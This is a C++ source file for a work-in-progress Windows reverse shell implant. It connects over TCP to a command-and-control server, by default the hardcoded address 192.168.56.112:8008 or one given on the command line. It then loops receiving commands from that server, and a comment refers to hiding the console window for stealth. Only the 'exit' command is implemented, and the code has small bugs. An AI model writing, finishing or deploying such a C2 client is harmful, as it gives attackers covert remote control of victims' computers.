#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#include <stdio.h>

// DEBUG, TEMP.
#include <iostream>

void RevShell(char* C2Server, int C2Port)
{
	// WSADATA object - contains details of application state regarding to network
	WSADATA wsaver;

	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &wsaver);


	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	// This if statement triggers if connection to C&C errored out.
	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
		std::cout << "[-] Error during connection..\n";
		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	}
	// Else connection successfull..
	else {
		std::cout << "[+] Connected..\n" << std::endl;
		
		char CommandReceived[1024] = "";
		// Waiting for incoming connection..
		while (true) {
			int Result = recv(tcpsock, CommandReceived, 1024, 0);
			std::cout << "Command Received: " << CommandReceived;
			std::cout << "Length of Command: " << Result << std::endl;
			
			if (strcmp(CommandReceived, "exit\n") == 0) {
				std::cout << "Command parsed: exit";
				std::cout << "Closing connection..." << std::endl;
				Sleep(1000);
				exit(0);
			}
			else {
				std::cout << "Command not parsed!" << std::endl;
				char buffer[20] = "Invalid command\n";
				send(tcpsock,buffer,strlen(buffer)+1,0);
				memset(buffer, 0, sizeof(buffer));
				memset(CommandReceived, 0, sizeof(CommandReceived));
			}
			memset(CommandReceived, 0, sizeof(CommandReceived));
		}
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}

int main(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	//std::cout << "Work in progres..\n";

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		RevShell(argv[1],port);

	} else {
	char host[] = "192.168.56.112";
	int port = 8008;
	RevShell(host,port);
	}
	return 0;
}
